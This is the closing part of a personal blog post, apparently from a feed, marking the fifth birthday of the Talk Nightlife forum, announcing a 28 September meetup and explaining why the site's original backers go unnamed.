<p>And yes, this was my non-angry blog post for today. I don't think I got that worked up, did I? And happy fifth birthday Talk Nightlife. You're my contentious little foster child. Also, if you're of a mind and interested, we're putting together a little shindig somewhere on the 28th of September. Keep checking <a href="http://forum.talknightlife.com/viewtopic.php?f=3&t=20004&st=0&sk=t&sd=a">this thread on TNL</a> for details. It's not an official event since we don't do official anything. Oh, and sign up if you want. Just mention you read about TNL on here and I'll process the login right away.</p>

<p>Sidebar (because it is how I write on this blog): Certain details about TNL I've left intentionally vague. Why? Well, anyone with half a brain knows who was originally behind TNL and who put the money in. However, the general feeling at the time was that their involvement be minimized in public, and it was never discussed further as time went on. Those requests still remain in force from where I sit, even if the investing parties don't remember or don't care. I'm "having some class" with regards to that. I'm definitely grateful for their initial involvement though. I got to help raise a bastard child of a website. If I hear otherwise, I'll let you know.</p>
]]></content>
  </entry>
  
</feed>
